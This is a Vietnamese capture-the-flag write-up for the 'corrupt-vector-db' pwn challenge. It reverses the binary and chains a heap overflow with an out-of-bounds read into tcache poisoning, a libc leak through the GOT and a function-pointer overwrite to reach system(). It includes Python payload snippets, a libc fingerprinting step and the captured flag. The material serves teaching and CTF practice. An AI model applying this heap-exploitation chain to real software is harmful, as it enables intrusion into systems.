# Writeup — corrupt-vector-db (Pwn3)

> **Flag:** `flag{3f7b4e09-e3e2-4eac-bce6-b182ddedc5f2}`
>
> Tóm tắt: heap overflow + OOB read trong một "vector database" → leak safe-linking key → tcache poisoning → fake object trong `.bss` → leak libc → overwrite writable function pointer → `system("cat /flag.txt")`.

---

## 1. Recon

Challenge phát `corrupt-vector-db-dist.tar.gz`, giải nén ra 3 file:

```text
vectorstore              — binary chính
libc.so.6                — Ubuntu GLIBC 2.35-0ubuntu3.13
ld-linux-x86-64.so.2
```

```text
$ file vectorstore
vectorstore: ELF 64-bit LSB executable, x86-64, dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, stripped
```

Chạy thử bằng loader đi kèm:

```bash
./ld-linux-x86-64.so.2 --library-path . ./vectorstore
```

![alt text](image.png)


## 2. kiemtra file 
![alt text](image-1.png)

| Mitigation | Trạng thái | Bằng chứng |
|---|---|---|
| PIE | **No PIE** | `readelf -h` → `Type: EXEC`, mọi địa chỉ cố định |
| NX | **Enabled** | `GNU_STACK` flags `RW` (không có `E`) |
| RELRO | **Full RELRO** | `GNU_RELRO 0x403d58 + 0x2a8` + `FLAGS: BIND_NOW` |
| Canary | **Yes** | import `__stack_chk_fail` |
| Strip | **Yes** | không có symbol table |

Hai hệ quả quan trọng nhất định hướng toàn bộ exploit:

1. **Full RELRO**  tức toàn bộ GOT read-only sau khi load → **không thể overwrite GOT**.
2. **No PIE** → `.data`/`.bss` có địa chỉ cố định, đặc biệt mọi thứ **từ `0x404010` trở đi nằm ngoài vùng RELRO và ghi được**. Đây chính là mấu chốt của bài.

Nên ta đi từ Strings (IDA) -> xref chuỗi `"UPLOAD"`/`"QUERY"`/`"SEARCH"` về hàm main để tìm luồng xử lý .(vì stript nên các hàm thành dạng sub -> khó tìm luồng )

![alt text](image-2.png)
## 3. Reverse cấu trúc vector slot

Sau khi đi từ string `"UPLOAD"` bằng `Ctrl + X`, ta nhảy được vào hàm xử lý command chính. Trong nhánh `UPLOAD`, chương trình nhận các thông tin như `id`, `dims`, `name`, `format`, sau đó lưu metadata của vector vào một bảng global.

Global table nằm tại địa chỉ:

```text
0x4040e0
```

Có thể thấy địa chỉ này ở đoạn load global table:


![alt text](image-4.png)


Tiếp tục lần theo nhánh `UPLOAD`, ta gặp block `loc_401624`. Trong block này có đoạn quan trọng dùng để tính địa chỉ slot và ghi metadata:

![alt text](image-3.png)

Trong writeup có thể ghi đoạn này là đoạn tại `0x401637`, vì instruction quan trọng:

```asm
imul    rax, 38h
```

nằm bên trong block `loc_401624` và tương ứng với địa chỉ khoảng `0x401637` khi IDA bật line prefix.

Lệnh quan trọng nhất là:

```asm
imul    rax, 38h
lea     r14, [rdx+rax]
```

Nó tương đương với:

```c
slot = table_base + id * 0x38;
```

Từ đó suy ra mỗi phần tử trong bảng global có kích thước:

```text
0x38 bytes
```

Các lệnh ghi field cho biết layout của slot.

Lệnh:

```asm
mov     [r14], ecx
```

ghi `dims` vào offset `+0x00`.

Lệnh:

```asm
mov     [r14+8], rcx
```

ghi con trỏ heap data vào offset `+0x08`.

Hai lệnh:

```asm
lea     r8, [rdx+rax+10h]
call    _strncpy
```

copy tên vector vào offset `+0x10`.

Lệnh:

```asm
mov     byte ptr [r14+2Fh], 0
```

ép byte cuối của vùng `name` thành null byte. Vì `name` bắt đầu ở offset `+0x10` và byte cuối nằm ở offset `+0x2f`, nên vùng `name` có kích thước:

```text
0x2f - 0x10 + 1 = 0x20 bytes
```

Cuối cùng, lệnh:

```asm
mov     dword ptr [r14+30h], 1
```

set `active = 1` tại offset `+0x30`.

Từ các offset trên, ta dựng được struct:

```c
struct vector_slot {
    uint32_t dims;       // +0x00
    uint32_t pad;        // +0x04
    float   *data;       // +0x08
    char     name[0x20]; // +0x10
    uint32_t active;     // +0x30
    uint32_t pad2;       // +0x34
};                       // size = 0x38
```

Ngoài ra, trong nhánh `DELETE`, chương trình lấy `slot[id].data` rồi gọi `free`:


![alt text](image-5.png)


Logic tương đương:

```c
free(slot[id].data);
slot[id].data = NULL;
slot[id].dims = 0;
slot[id].active = 0;
```

Điểm này quan trọng cho exploit vì chunk sau khi bị `DELETE` sẽ được đưa vào `tcache`, còn slot trong global table bị đánh dấu inactive.

## 4. Bug 1 — Heap overflow trong `UPLOAD` binary mode

Trong nhánh `UPLOAD`, chương trình hỏi:

```text
Data format (0=text, 1=binary):
```

Nếu chọn mode binary, chương trình sẽ cấp phát buffer theo số chiều `dims` của vector.

![alt text](image-6.png)



Trên Linux amd64, tham số thứ nhất của hàm được truyền qua `rdi`/`edi`, nên đoạn trên tương đương:

```c
buf = malloc(dims * 4);
```

Ví dụ nếu nhập:

```text
dims = 8
```

thì chương trình chỉ cấp phát:

```text
8 * 4 = 32 bytes = 0x20
```

Sau đó, ở binary mode, chương trình hỏi tiếp `Byte count:` rồi đọc giá trị này bằng `scanf`.

![alt text](image-7.png)

```asm
loc_401A19:
lea     rsi, aByteCount            ; "Byte count: "
mov     edi, 1
xor     eax, eax
call    ___printf_chk

mov     rdi, cs:stdout             ; stream
call    _fflush

xor     eax, eax
lea     rsi, [rsp+1098h+var_106C]  ; &byte_count
mov     rdi, r14                   ; format, ví dụ "%u"
call    ___isoc99_scanf
```

Ở đây, `var_106C` là biến local dùng để lưu `byte_count`. Lệnh:

```asm
lea     rsi, [rsp+1098h+var_106C]
call    ___isoc99_scanf
```

tương đương với:

```c
scanf("%u", &byte_count);
```

Điểm nguy hiểm là `byte_count` được nhập riêng từ người dùng, nhưng chương trình không kiểm tra:

```c
byte_count <= dims * 4
```

Sau khi đọc `byte_count`, chương trình dùng chính giá trị này làm size cho `read`.

![alt text](image-8.png)

```asm
mov     rax, [rsp+1098h+ptr]       ; heap buffer
...
call    _read
```

Theo calling convention amd64, hàm `read` nhận tham số như sau:

```text
rdi = fd
rsi = buffer
rdx = size
```

Vì vậy đoạn gọi `read` tương đương:

```c
read(0, buf, byte_count);
```

Pseudo-code lỗi:

```c
buf = malloc(dims * 4);      // buffer cấp phát theo dims
scanf("%u", &byte_count);    // byte_count do user nhập
read(0, buf, byte_count);    // không check byte_count <= dims * 4
```

Ví dụ chọn:

```text
dims = 8
byte_count = 0x60
```

thì chương trình sẽ thực hiện:

```c
malloc(0x20);
read(0, buf, 0x60);
```

Tức là chỉ cấp phát `0x20` byte nhưng lại đọc `0x60` byte vào cùng buffer. Kết quả là dữ liệu ghi tràn ra ngoài chunk heap hiện tại và đè sang các chunk kế cận.

Đây là lỗi **heap overflow** trong `UPLOAD` binary mode, với độ dài và nội dung overflow do người dùng kiểm soát.

## 5. Bug 2 — OOB read trong `QUERY`

`QUERY` nhận `ID / Offset / Count`. Trong nhánh này, chương trình chỉ kiểm tra `count <= 0x100`:

![alt text](image-9.png)

```asm
mov     eax, [rsp+1098h+var_106C] ; count
cmp     eax, 100h                 ; chỉ check count <= 0x100
ja      loc_401A5B
```

Không thấy check kiểu:

```c
offset + count <= slot[id].dims
```

Sau đó chương trình dùng offset/index để cộng thẳng vào `slot[id].data`:

![alt text](image-10.png)

```asm
mov     rax, [rdi+rax+8]          ; rax = slot[id].data
lea     rax, [rax+rcx*4]          ; ptr = data + offset * 4
mov     rcx, [rax]                ; đọc raw qword
cvtss2sd xmm0, dword ptr [rax]    ; đọc float
call    ___printf_chk             ; in "[%u] %f (raw: 0x%016lx)"
```

Pseudo-code lỗi:

```c
if (count > 0x100)
    error();

ptr = slot[id].data + offset * 4;

printf("[%u] %f (raw: 0x%016lx)\n",
       i,
       *(float *)ptr,
       *(uint64_t *)ptr);
```

Vì `offset` không bị so sánh với `dims`, ta có thể cho `offset` vượt quá số chiều thật của vector. Khi đó `QUERY` sẽ đọc ra ngoài vùng data của vector.

Đặc biệt, chương trình còn in cả:

```text
raw: 0x%016lx
```

nên bug này cho ta primitive đọc/leak 8 byte tại:

```c
slot[id].data + offset * 4
```

=> Đây là lỗi **OOB read**, dùng để leak dữ liệu heap/safe-linking key phục vụ tcache poisoning.


## 6. Leak safe-linking key

glibc 2.35 sử dụng safe-linking cho tcache:

```c
encoded_next = next ^ (chunk_addr >> 12);
```

Đầu tiên tạo ba chunk cùng size A, B, C rồi `DELETE B`. Khi B là phần tử đầu trong tcache bin, `next = NULL`, nên qword đầu user-data của B sẽ là:

```c
B->next = NULL ^ (B >> 12)
        = B >> 12;
```

Kiểm chứng bằng GDB:

![alt text](image-12.png)

![alt text](image-13.png)


![alt text](image-14.png)
Có thể thấy qword đầu của chunk B sau khi `free` là:

```text
0x7ffff7fff
```

Đồng thời:

```text
(B >> 12) = 0x7ffff7fff
```

Hai giá trị trùng khớp, chứng minh qword đầu của chunk B chính là **safe-linking key**.

Sau đó sử dụng bug OOB read của `QUERY` để đọc qword này, từ đó leak được key phục vụ cho bước tcache poisoning.

## 7. Tcache poisoning

Có key của C, ghi vào C (đang nằm trong tcache) giá trị:

```c
C->next = target ^ (C >> 12)
```

thì hai lần `malloc` tiếp theo trả về **C** rồi **target** — trong đó `target` là địa chỉ tùy ý. Việc ghi được thực hiện bằng heap overflow từ A (A được realloc ngay trước C):

```python
overflow = b'A' * (chunk_size * 2)   # vượt qua B, dừng tại C->next
overflow += p64(target ^ c_key)      # safe-linked next
overflow += p64(0)                   # zero key field của C
```

Exploit dùng **hai size class tách biệt** để hai lần poisoning không làm nhiễu nhau:

```text
dims = 8  → malloc(0x20) → chunk 0x30   (lần 1: tạo fake slot)
dims = 12 → malloc(0x30) → chunk 0x40   (lần 2: overwrite 0x404010)
```

## 8. Viết payload stage 1 — Fake vector slot trong .bss → leak libc

No PIE nên global table cố định tại `0x4040e0`. Ta chọn làm đích poisoning một slot chưa dùng:

```text
fake_slot_addr = 0x4040e0 + 10 * 0x38 = 0x404310
```

`malloc` trả về `0x404310`, và `read` của UPLOAD ghi thẳng payload 0x38 bytes vào đó — tạo một **vector slot giả hoàn toàn hợp lệ**:

```python
fake_slot  = p32(1) + p32(0)     # dims   = 1
fake_slot += p64(0x403f70)       # data   = free@GOT
fake_slot += b'FAKE'.ljust(0x20, b'\x00')
fake_slot += p32(1) + p32(0)     # active = 1
```

`free@GOT = 0x403f70` lấy từ `readelf -rW ./vectorstore | grep free`. Sau đó:

```text
QUERY 10 0 1
```

đọc raw qword tại `0x403f70` → **leak địa chỉ `free` thật trong libc**. Nhân tiện, vì QUERY cộng `offset*4`, ta đọc được cả các GOT entry lân cận (puts, read, malloc, `__libc_start_main`...) — cái này sẽ rất hữu ích ở phần remote.

Từ leak:

```python
libc_base   = free_leak - FREE_OFF
system_addr = libc_base + SYSTEM_OFF
```



## 9. Viết payload stage 2 — Overwrite 0x404010 và lấy flag

Lần poisoning thứ hai (bin 0x40, các slot 4–7) nhắm `target = 0x404010`, payload `p64(system_addr)`. Sau đó chỉ cần gửi:

```text
SEARCH cat /flag.txt
```

Chain hoàn chỉnh:

```text
UPLOAD binary mode   malloc(dims*4) nhưng read(byte_count)   → heap overflow
QUERY                offset không check với dims, in raw qword → OOB read
DELETE               free chunk vào tcache
QUERY OOB            → leak safe-linking key
heap overflow        → ghi tcache->next = target ^ key        → poisoning
poisoning lần 1      → malloc trả về 0x404310 (slot 10 trong .bss)
                     → ghi fake slot {dims=1, data=free@GOT, active=1}
QUERY 10             → leak free@libc → libc_base → system
poisoning lần 2      → malloc trả về 0x404010
                     → ghi system vào con trỏ strlen
SEARCH cat /flag.txt → system("cat /flag.txt") → flag
```

## 11. Twist trên remote — server chạy libc khác bản kèm theo



Exploit chạy local với libc kèm challenge (2.35-0ubuntu3.13, `free @ 0xa53e0`) thì ngon lành, nhưng khi đánh remote:

```text
[+] free@libc  = 0x77ab4b3f63a0
[+] libc base  = 0x77ab4b350fc0     ← không page-aligned!
[+] system     = 0x77ab4b3a1d30
timeout: the monitored command dumped core
Illegal instruction
```

`libc_base` tính ra tận số `0xfc0` → offset `free` của server **không phải 0xa53e0**. Nhìn low-12-bits của leak (`0x3a0` so với `0x3e0`) biết ngay server dùng một bản libc khác bản dist — `system` sai địa chỉ nên nhảy vào giữa code và chết `SIGILL`.

May mắn là primitive từ stage 1 cho phép đọc **toàn bộ GOT** chỉ bằng cách tăng dần offset của `QUERY 10` (các entry cách nhau 8 byte → offset = 0, 2, 4, ...):

```text
free              0x00007dec0a2a63a0  low12=0x3a0
strncpy           0x00007dec0a3b4330  low12=0x330
puts              0x00007dec0a281e10  low12=0xe10
read              0x00007dec0a315810  low12=0x810
malloc            0x00007dec0a2a6060  low12=0x060
__libc_start_main 0x00007dec0a22adc0  low12=0xdc0
... (17 entry đều đã resolve)
```

ASLR chỉ randomize libc theo trang nên low-12-bits của mỗi leak chính là low-12-bits offset của symbol. Fingerprint bộ này trên **libc.rip**:

```bash
curl -s -X POST https://libc.rip/api/find -H 'Content-Type: application/json' \
  -d '{"symbols":{"free":"3a0","puts":"e10","malloc":"060","read":"810",
                   "fgets":"340","setvbuf":"5b0","__libc_start_main":"dc0",
                   "__printf_chk":"be0"}}'
```

Kết quả khớp **duy nhất** một bản:

```json
{
  "id": "libc6_2.35-0ubuntu3.14_amd64",
  "symbols": { "free": "0xa53a0", "system": "0x50d70", "puts": "0x80e10", ... }
}
```

Server chạy **2.35-0ubuntu3.14** (dist là `.13`): `free` lệch đúng `0x40` còn `system` không đổi. Kiểm chứng: `0x7dec0a2a63a0 − 0xa53a0 = 0x7dec0a201000` — page-aligned hoàn hảo.

Sửa duy nhất một hằng số trong exploit (`FREE_OFF = 0x0a53a0`) rồi chạy lại:

```text
$ python3 solve_remote.py 222.255.138.122 10143
[+] free@libc  = 0x720a276273a0
[+] libc base  = 0x720a27582000
[+] system     = 0x720a275d2d70
flag{3f7b4e09-e3e2-4eac-bce6-b182ddedc5f2}
```

